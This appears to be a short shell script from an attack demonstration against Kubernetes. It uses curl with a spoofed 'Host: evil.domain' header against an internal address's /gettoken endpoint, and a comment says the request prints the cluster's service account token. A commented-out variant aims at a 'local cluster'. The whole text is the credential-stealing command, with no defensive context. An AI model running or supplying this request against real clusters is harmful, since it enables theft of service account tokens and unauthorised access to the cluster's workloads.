curl -H "Host: evil.domain" http://192.168.101.1/gettoken # remote cluster
# curl -H "Host: evil.domain" http://192.168.101.0/gettoken # local cluster
# prints the kubernetes service account token
sleep 1